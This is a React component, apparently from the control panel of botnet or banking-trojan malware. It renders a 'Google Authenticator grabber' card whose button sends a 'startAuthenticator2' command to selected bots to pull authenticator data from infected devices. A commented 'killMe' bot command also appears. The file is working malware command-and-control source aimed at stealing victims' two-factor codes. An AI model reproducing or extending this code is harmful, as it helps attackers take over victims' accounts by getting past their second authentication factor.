import React from 'react';
import SettingsContext from '../../Settings';


//{"name":"killMe"}
class GetGoogleAUTH extends React.Component {

    constructor(props) {
        super(props);
    }

    onClickGoogle = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"startAuthenticator2"}');
            SettingsContext.ShowToast("success", "Send, Google Authenticator");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Google Authenticator grabber</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Get data from google authenticator on selected bots</h6>
                    <button type="button" onClick={this.onClickGoogle} class="btn btn-right btn-outline-success">GOOGLE AUTH</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default GetGoogleAUTH;